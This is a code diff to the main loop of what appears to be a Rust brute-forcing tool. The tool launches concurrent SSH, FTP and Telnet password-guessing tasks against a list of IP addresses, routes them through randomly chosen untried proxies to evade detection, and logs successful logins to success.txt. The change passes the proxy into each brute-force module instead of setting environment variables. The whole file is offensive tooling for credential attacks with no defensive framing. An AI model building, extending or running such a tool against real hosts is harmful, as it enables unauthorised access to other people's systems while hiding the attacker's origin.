@@ -14,7 +14,7 @@ use std::{
 };
 use tokio::{sync::Semaphore, fs::OpenOptions, io::AsyncWriteExt};
 use events::BruteEvent;
-use crate::proxy::{set_all_proxy_env, clear_proxy_env_vars, pick_random_untried_proxy, parse_proxy_line};
+use crate::proxy::{pick_random_untried_proxy, parse_proxy_line};
 
 const MAX_CONCURRENT_IPS: usize = 10;
 
@@ -38,7 +38,6 @@ async fn main() -> Result<()> {
         .open("success.txt")
         .await?;
 
-    // ✅ Shared proxies tracker with automatic recycling
     let tried_proxies = Arc::new(Mutex::new(HashSet::new()));
 
     for line in reader.lines() {
@@ -55,28 +54,35 @@ async fn main() -> Result<()> {
                 pick_random_untried_proxy(&proxies, &mut tried)
             };
 
-            if let Some(proxy) = proxy_choice {
+            let proxy = proxy_choice.unwrap_or_default();
+            if !proxy.is_empty() {
                 println!("[*] Using proxy: {}", proxy);
-                set_all_proxy_env(&proxy);
-
-                // ✅ Also mark proxy as tried
-                {
-                    let mut tried = tried_proxies.lock().unwrap();
-                    tried.insert(proxy.clone());
-                }
-            } else {
-                println!("[*] No proxy available, clearing...");
-                clear_proxy_env_vars();
             }
 
-            // Launch bruteforce modules
-            let ssh_task = tokio::spawn(ssh::bruteforce_ip(ip.clone(), Arc::clone(&usernames), Arc::clone(&passwords)));
-            let ftp_task = tokio::spawn(ftp::bruteforce_ip(ip.clone(), Arc::clone(&usernames), Arc::clone(&passwords)));
-            let telnet_task = tokio::spawn(telnet::bruteforce_ip(ip.clone(), Arc::clone(&usernames), Arc::clone(&passwords)));
+            let ssh_task = tokio::spawn(ssh::bruteforce_ip(
+            ip.clone(),
+            Arc::clone(&usernames),
+            Arc::clone(&passwords),
+            proxy.clone(), // <-- add this!
+            ));
+
+
+            let ftp_task = tokio::spawn(ftp::bruteforce_ip(
+                ip.clone(),
+                Arc::clone(&usernames),
+                Arc::clone(&passwords),
+                proxy.clone(),
+            ));
+
+            let telnet_task = tokio::spawn(telnet::bruteforce_ip(
+            ip.clone(),
+            Arc::clone(&usernames),
+            Arc::clone(&passwords),
+            proxy.clone(),  // <-- fixed now
+            ));
 
             let (ssh_events, ftp_events, telnet_events) = tokio::join!(ssh_task, ftp_task, telnet_task);
 
-            clear_proxy_env_vars();
             drop(permit);
 
             let mut all_events = Vec::new();
